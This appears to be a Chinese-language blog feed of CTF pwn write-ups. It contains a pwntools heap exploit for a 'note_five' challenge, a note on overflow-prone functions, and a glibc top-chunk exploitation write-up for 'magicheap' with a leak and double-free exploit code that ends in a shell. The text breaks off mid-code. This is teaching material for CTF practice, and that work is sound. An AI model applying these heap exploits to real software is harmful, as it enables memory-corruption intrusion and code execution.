coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=<span class="keyword">None</span></span><br><span class="line">ispow=<span class="number">1</span></span><br><span class="line">isdebug=<span class="number">0</span></span><br><span class="line">islocal=<span class="number">1</span></span><br><span class="line">binary=<span class="string">'./note_five'</span></span><br><span class="line">libc=ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">mode_offset=<span class="number">0xc0</span></span><br><span class="line">writeptr_offset=<span class="number">0x28</span></span><br><span class="line">writebase_offset=<span class="number">0x20</span></span><br><span class="line"> <span class="comment">#define vtable_offset 0xd8</span></span><br><span class="line">__author__ = <span class="string">'3summer'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data            :io.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data      :io.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data            :io.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data      :io.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       :io.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims,drop=<span class="keyword">True</span>:io.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                  :io.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data            :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data            :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size)</span>:</span></span><br><span class="line">    sla(<span class="string">'&gt;&gt;'</span>,str(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">'idx'</span>,str(index))</span><br><span class="line">    sla(<span class="string">'ize'</span>,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">     sla(<span class="string">'&gt;&gt;'</span>,str(<span class="number">2</span>))</span><br><span class="line">     sla(<span class="string">'idx'</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span><span class="params">(index)</span>:</span></span><br><span class="line">     sla(<span class="string">'&gt;&gt;'</span>,str(<span class="number">3</span>))</span><br><span class="line">     sla(<span class="string">'idx'</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ed</span><span class="params">(index,con)</span>:</span></span><br><span class="line">    sla(<span class="string">'&gt;&gt;'</span>,str(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">'idx'</span>,str(index))</span><br><span class="line">    sa(<span class="string">'con'</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mag</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">     sla(<span class="string">'&gt;&gt;'</span>,str(<span class="number">4</span>))</span><br><span class="line">     sla(<span class="string">'idx1'</span>,str(idx1))</span><br><span class="line">     sla(<span class="string">'idx2'</span>,str(idx2))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(index=<span class="string">'###'</span>)</span>:</span></span><br><span class="line">    raw_input(index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(io)</span>:</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x98</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x2d0</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x90</span>)</span><br><span class="line">    ed(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x1f0</span>+p64(<span class="number">0x200</span>)+p64(<span class="number">0xe0</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    rm(<span class="number">1</span>)</span><br><span class="line">    ed(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x98</span>+p8(<span class="number">1</span>))</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x90</span>)</span><br><span class="line">    rm(<span class="number">3</span>)</span><br><span class="line">    rm(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x200</span>)</span><br><span class="line"><span class="comment">#    add(0,0x98)</span></span><br><span class="line"><span class="comment">#    add(1,0x2d0)</span></span><br><span class="line"><span class="comment">#    add(2,0x90)</span></span><br><span class="line"><span class="comment">#    ed(1,'a'*0x1f0+p64(0x200)+p64(0xe0)+'\n')</span></span><br><span class="line"><span class="comment">#    rm(1)</span></span><br><span class="line"><span class="comment">#    ed(0,'a'*0x98+p8(1))</span></span><br><span class="line"><span class="comment">#    add(0,0x90)</span></span><br><span class="line"><span class="comment">#    add(1,0x90)</span></span><br><span class="line"><span class="comment">#    rm(0)</span></span><br><span class="line"><span class="comment">#    add(0,0x200)</span></span><br><span class="line"><span class="comment">#    rm(2)</span></span><br><span class="line"><span class="comment">#    add(0,0x1f0)</span></span><br><span class="line"><span class="comment">#    add(2,0x170)</span></span><br><span class="line"><span class="comment">#    ed(0,'a'*0x90+p64(0)+p64(0xa1)+'\n')</span></span><br><span class="line"><span class="comment">#    rm(1)</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x160</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xb0</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xd8</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x150</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">    ed(<span class="number">1</span>,<span class="string">'/bin/sh\0'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\x00'</span>)+p64(<span class="number">1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    rm(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xd8</span>)</span><br><span class="line"><span class="comment">#    b()</span></span><br><span class="line">    rm(<span class="number">2</span>)</span><br><span class="line">    rm(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xd8</span>)</span><br><span class="line"><span class="comment">#    libc_base=int(input(),16)</span></span><br><span class="line">    ed(<span class="number">0</span>,p64(<span class="number">0</span>)+<span class="string">'\x90\x13\x84'</span>+<span class="string">'\n'</span>)</span><br><span class="line">    rm(<span class="number">1</span>)</span><br><span class="line">    rm(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#    b()</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x98</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0xe8</span>)</span><br><span class="line">    ed(<span class="number">1</span>,<span class="string">'/bin/sh\0'</span>.ljust(<span class="number">0x18</span>,<span class="string">'\x00'</span>)+p64(<span class="number">1</span>)+<span class="string">'\x00'</span>*<span class="number">0x98</span>+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#    b()</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x90</span>)</span><br><span class="line">    rm(<span class="number">1</span>)</span><br><span class="line">    ed(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x90</span>+<span class="string">'/bin/sh\0'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)+p8(<span class="number">0x61</span>)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#    b()</span></span><br><span class="line"><span class="comment">#    heap_base=int(input(),16)</span></span><br><span class="line"><span class="comment">#    ed(2,p64(0)+p64(heap_base+0x810)+'\n')#p16(0x5820))</span></span><br><span class="line"><span class="comment">#    b()</span></span><br><span class="line">    ed(<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    rm(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#    b()</span></span><br><span class="line">    ed(<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x1540</span><span class="number">-0x10</span>)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#    add(2,0x90)</span></span><br><span class="line"><span class="comment">#    ed(3,'a'*0x90+p64(0)+p64(0xa1)+p64(libc.symbols['system']+libc_base)+'\n')</span></span><br><span class="line"><span class="comment">#   b()</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x90</span>)</span><br><span class="line">    sla(<span class="string">'&gt;&gt;'</span>,str(<span class="number">4</span>))</span><br><span class="line">    sl(<span class="string">'cat flag'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> islocal:</span><br><span class="line">        io=process(binary)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io=remote(<span class="string">'112.126.103.195'</span>,<span class="number">9999</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> ispow:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                io=main()</span><br><span class="line">                exploit(io)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io=main()</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            gdb.attach(io)</span><br><span class="line">        exploit(io)</span><br><span class="line">    irt()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      最近在打byte ctf的时候碰到新的利用方式记录一下子
    
    </summary>
    
    
    
      <category term="linux,pwn" scheme="http://yoursite.com/tags/linux-pwn/"/>
    
  </entry>
  
  <entry>
    <title>&#39;攻防世界刷题记录&#39;</title>
    <link href="http://yoursite.com/2019/08/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2019/08/02/攻防世界刷题记录/</id>
    <published>2019-08-02T06:02:27.000Z</published>
    <updated>2019-09-17T16:15:07.517Z</updated>
    
    <content type="html"><![CDATA[<ul><li>可以造成溢出的函数不只是有gets()函数，getline(),scanf(“%s”, s);可以输入任意长度，可能会导致栈溢出</li></ul>]]></content>
    
    <summary type="html">
    
      刷了一个暑假的pwn题目，总结一下遇到的问题
    
    </summary>
    
    
    
      <category term="ctf,pwn" scheme="http://yoursite.com/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>top chunk</title>
    <link href="http://yoursite.com/2019/06/06/top-chunk/top-chunk/"/>
    <id>http://yoursite.com/2019/06/06/top-chunk/top-chunk/</id>
    <published>2019-06-06T11:53:30.000Z</published>
    <updated>2019-09-15T07:44:35.223Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-top-chunk"><a href="#0x00-top-chunk" class="headerlink" title="0x00 top chunk"></a>0x00 top chunk</h1><p>top chunk是一个特殊的chunk，当申请堆空间的时候，如果，bin链表中没有size合适的chunk，就会从top chunk分配空间,详细的结构体信息见</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/#top-chunk" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/#top-chun</a></p><p>写一段代码来验证是不是这样</p><ul><li><p>test.c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">        malloc(0x20);</span><br><span class="line">        malloc(0x100);        </span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编译命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o malloc test.c -g</span><br></pre></td></tr></table></figure></li><li><p>gdb调试<br>首先断点在 <strong>main()</strong> 函数,因为要用到libc的源码，所以，首先需要下载，解压，然后在gdb使用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directory /home/xx/glibc-2.23/malloc/</span><br></pre></td></tr></table></figure></li></ul><p><strong>/home/xx/glibc-2.23/malloc/</strong> 为你libc源码的路径，因为主要分析libc下malloc文件下的源码，所以直接指定malloc文件就可以了，要不然有的时候libc找不到</p><p>这里主要分析第二个malloc</p><ul><li>先看一下第一个malloc分配之后，heap布局<br><img src="/2019/06/06/top-chunk/top-chunk/top_bk.png" alt=""><br>最后一个size 很大的chunk 就是我们的top chunk的了<br>大概调到这里的时候，就是top chunk的操作了<br><img src="/2019/06/06/top-chunk/top-chunk/gdb.png" alt=""></li><li>在源码找到这段关键代码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">3792       victim = av-&gt;top;</span><br><span class="line">3793       size = chunksize (victim);</span><br><span class="line">3794</span><br><span class="line">3795       if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</span><br><span class="line">3796         &#123;</span><br><span class="line">3797           remainder_size = size - nb;</span><br><span class="line">3798           remainder = chunk_at_offset (victim, nb);</span><br><span class="line">3799           av-&gt;top = remainder;</span><br><span class="line">3800           set_head (victim, nb | PREV_INUSE |</span><br><span class="line">3801                     (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">3802           set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">3803</span><br><span class="line">3804           check_malloced_chunk (av, victim, nb);</span><br><span class="line">3805           void *p = chunk2mem (victim);</span><br><span class="line">3806           alloc_perturb (p, bytes);</span><br><span class="line">3807           return p;</span><br><span class="line">3808         &#125;</span><br></pre></td></tr></table></figure><p>这里的 <strong>victim</strong> 是一个 <strong>malloc_chunk</strong> 的指针，结构如下，具体见<br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/#malloc_chunk" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/#malloc_chunk</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1108 struct malloc_chunk &#123;</span><br><span class="line">1109</span><br><span class="line">1110   INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */</span><br><span class="line">1111   INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */</span><br><span class="line">1112</span><br><span class="line">1113   struct malloc_chunk* fd;         /* double links -- used only if free. */</span><br><span class="line">1114   struct malloc_chunk* bk;</span><br><span class="line">1115</span><br><span class="line">1116   /* Only used for large blocks: pointer to next larger size.  */</span><br><span class="line">1117   struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</span><br><span class="line">1118   struct malloc_chunk* bk_nextsize;</span><br><span class="line">1119 &#125;;</span><br></pre></td></tr></table></figure></p><p><strong>av</strong> 是指向这个进程的 <strong>main_arena</strong> 再来看一下 <strong>main_area</strong> 结构体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">static struct malloc_state main_arena =</span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = 1</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>main_arena是 <strong>malloc_state</strong> 的结构体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_state</span><br><span class="line">&#123;</span><br><span class="line">  /* Serialize access.  */</span><br><span class="line">  mutex_t mutex;</span><br><span class="line"></span><br><span class="line">  /* Flags (formerly in max_fast).  */</span><br><span class="line">  int flags;</span><br><span class="line"></span><br><span class="line">  /* Fastbins */</span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  /* Base of the topmost chunk -- not otherwise kept in a bin */</span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  /* The remainder from the most recent split of a small request */</span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  /* Normal bins packed as described above */</span><br><span class="line">  mchunkptr bins[NBINS * 2 - 2];</span><br><span class="line"></span><br><span class="line">  /* Bitmap of bins */</span><br><span class="line">  unsigned int binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  /* Linked list */</span><br><span class="line">  struct malloc_state *next;</span><br><span class="line"></span><br><span class="line">  /* Linked list for free arenas.  Access to this field is serialized</span><br><span class="line">     by free_list_lock in arena.c.  */</span><br><span class="line">  struct malloc_state *next_free;</span><br><span class="line"></span><br><span class="line">  /* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="line">     the free list.  Access to this field is serialized by</span><br><span class="line">     free_list_lock in arena.c.  */</span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  /* Memory allocated from the system in this arena.  */</span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>从 <strong>malloc_state</strong> 结构体可以知道，<strong>av-&gt;top</strong> 就是 <strong>main_arena</strong> 的top chnk指针，在top chunk的分割出要分配的chunk的操作全靠这个指针来寻址</p><p>让我们来看一下分配完chunk的布局<br><img src="/2019/06/06/top-chunk/top-chunk/top_chunk.png" alt=""></p><ul><li>思考：<br>既然top chunk这么特殊,怎么才能利用呢？<h1 id="0x01-利用方式"><a href="#0x01-利用方式" class="headerlink" title="0x01 利用方式"></a>0x01 利用方式</h1><h2 id="0x00-House-Of-Force"><a href="#0x00-House-Of-Force" class="headerlink" title="0x00 House Of Force"></a>0x00 House Of Force</h2>主要控制chunk的size段，来实现任意address malloc<h3 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h3></li><li>可以控制top chunk的size段</li><li>程序可以malloc 任意size的chunk<h3 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h3>见</li></ul><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force/</a></p><h2 id="0x02-另一种利用方式"><a href="#0x02-另一种利用方式" class="headerlink" title="0x02 另一种利用方式"></a>0x02 另一种利用方式</h2><p>这里我就要介绍我在比赛中学到另一种用法,既然，既然在top chunk中分配chunk，要依靠top chunk的指针，我们是不是可以控制top chunk的指针，来实现任意address分配呢？答案是肯定的</p><h3 id="0x00-利用场景"><a href="#0x00-利用场景" class="headerlink" title="0x00 利用场景"></a>0x00 利用场景</h3><ul><li>有uaf或者double</li><li>malloc 分配size在0x40以上，准确来说如果是大于0x70，也没有必要用这种利用方式，因为你有double free直接分配到malloc_hook的位置填入one_gadget就可以了</li><li>要实现任意address malloc</li></ul><p>接下来，结合一道线下题目来使用一下这种利用方式</p><h1 id="0x02-magicheap"><a href="#0x02-magicheap" class="headerlink" title="0x02 magicheap"></a>0x02 magicheap</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这道题目比赛的时候一直没做出来，主要允许malloc的size实在太小了，最多允许malloc size是0x50的chunk，也就是分配0x60 chunk，还有leak address的地方，由于我用的是 <strong>sendlineafter()</strong> 函数，这样的话，<strong>printf()</strong> 和 <strong>puts()</strong> 函数就会被我发送的‘\n’ 截断掉，所以，我以为没有leak address的函数，我一直在尝试用 <strong>House of Roman</strong>，发现 <strong>size</strong> 小了一点没法利用，赛后请教大佬，才学到这种利用方式</p><h2 id="0x01-环境说明"><a href="#0x01-环境说明" class="headerlink" title="0x01 环境说明"></a>0x01 环境说明</h2><ul><li>本题给出了libc的版本是2.23<h2 id="break-it"><a href="#break-it" class="headerlink" title="break it"></a>break it</h2><h3 id="0x01-checksec"><a href="#0x01-checksec" class="headerlink" title="0x01 checksec"></a>0x01 checksec</h3><img src="/2019/06/06/top-chunk/top-chunk/checksec.png" alt=""></li></ul><p>保护全开</p><h3 id="0x02-漏洞点"><a href="#0x02-漏洞点" class="headerlink" title="0x02 漏洞点"></a>0x02 漏洞点</h3><h4 id="0x00-leak-address"><a href="#0x00-leak-address" class="headerlink" title="0x00 leak address"></a>0x00 leak address</h4><p>在输入name和id的时候，你可以leak到一个栈的address和一个libc的address<br><img src="/2019/06/06/top-chunk/top-chunk/leak.png" alt=""><br>静态调试不容易看，动态调试看一下<br>gdb在这个函数下断点，在0xe33这个位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *$rebase(0xe33)</span><br></pre></td></tr></table></figure></p><p>name先随便输入，比如说aaaa,id输入bbbb<br><img src="/2019/06/06/top-chunk/top-chunk/name.png" alt=""></p><p>到达断点，看一下stack，发现id下面有一个libc的address,name的下面有一个栈的地址，所以，调整一下输入的长度，就可以把address leak出来</p><p><img src="/2019/06/06/top-chunk/top-chunk/stack.png" alt=""></p><p>对应的部分exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sa(&apos;name?&apos;,&apos;a&apos;*0x18)</span><br><span class="line">ru(&apos;\n&apos;)</span><br><span class="line">stack_addr=u64(ru(&apos;input&apos;)[0x18:0x18+6].ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &apos;stack_addr=&apos;+hex(stack_addr)</span><br><span class="line">sa(&apos;ID&apos;,&apos;a&apos;*8)</span><br><span class="line">ru(&apos;a&apos;*8)</span><br><span class="line">libc_base=u64(ru(&apos;\n&apos;)[0:6].ljust(8,&apos;\x00&apos;))-libc.sym[&apos;_IO_file_setbuf&apos;]-9</span><br></pre></td></tr></table></figure></p><h3 id="0x01-free时指针未置0"><a href="#0x01-free时指针未置0" class="headerlink" title="0x01 free时指针未置0"></a>0x01 free时指针未置0</h3><p><img src="/2019/06/06/top-chunk/top-chunk/free.png" alt=""></p><p>这就可以造成double free</p><h3 id="0x02-遇到的问题"><a href="#0x02-遇到的问题" class="headerlink" title="0x02 遇到的问题"></a>0x02 遇到的问题</h3><p><img src="/2019/06/06/top-chunk/top-chunk/malloc.png" alt=""></p><p>允许malloc的size太小</p><h3 id="0x03-具体步骤"><a href="#0x03-具体步骤" class="headerlink" title="0x03 具体步骤"></a>0x03 具体步骤</h3><p>首先利用利用double free 使得fastbin chunk的fd指向main_arena附近<br><img src="/2019/06/06/top-chunk/top-chunk/double-free.png" alt=""></p><p><img src="/2019/06/06/top-chunk/top-chunk/main.png" alt=""></p><p>由上面的 <strong>malloc_state</strong> 结构体可知，top chunk指针上面是fastbin链表，又因为x64的heap一般分配到0x55或者0x56开头的地址,这给了chunk可以分配到main_arena附近的可能，因为chunk分配的时候，要过一个check</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2926   assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">2927           ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br></pre></td></tr></table></figure><p>这是检查以下几个条件</p><ul><li>chunk指针是否为空</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">342 #define SIZE_SZ                (sizeof(INTERNAL_SIZE_T))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* size field is or&apos;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><br><span class="line">1274 #define IS_MMAPPED 0x2</span><br><span class="line">1275</span><br><span class="line">1276 /* check for mmap()&apos;ed chunk */</span><br><span class="line">1277 #define chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span><br></pre></td></tr></table></figure><ul><li>chunk的是否由mmap分配，主要是检查size的低2位是否为2，当chunk是0x56的时候可以满足条件</li><li>chunk的所在的area是不是和当前的area相等</li></ul><p>第一条和第三条不太可能成功，只能不断尝试<br>对应部分exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">add(0x40,&apos;aaaaaaaa&apos;)</span><br><span class="line">add(0x40,&apos;aaaaaaaaa&apos;)</span><br><span class="line">add(0x50,&apos;aaaaa&apos;)</span><br><span class="line">add(0x40,&apos;aaaaaaa&apos;)</span><br><span class="line">rm(2)</span><br><span class="line">rm(0)</span><br><span class="line">rm(1)</span><br><span class="line">rm(0)</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">add(0x40,p64(malloc_hook-3-8+0x40))</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">add(0x40,&apos;aaa&apos;)</span><br><span class="line">add(0x40,&apos;aaa&apos;)</span><br><span class="line">try:</span><br><span class="line">        add(0x40,&apos;a&apos;*(3+8*4)+p64(stack_addr-88-0x10))</span><br><span class="line">        raw_input(&apos;11&apos;)</span><br><span class="line">except:</span><br><span class="line">        io.close()</span><br><span class="line">        io=main()</span><br><span class="line">        exploit(io)</span><br><span class="line">print &apos;heap start 0x56 you win&apos;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/06/06/top-chunk/top-chunk/main_area.png" alt=""></p><p>如图我们已经分配成功了,接下来就是任意address分配了，你可以分配到malloc_hook的位置去写one_gadget,由于本题one_gadget全无效，所以，需要控制栈，把chunk分配到栈上覆盖返回值地址就可以了</p><p><img src="/2019/06/06/top-chunk/top-chunk/shell.png" alt=""></p><p>如图，就可以getshell了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 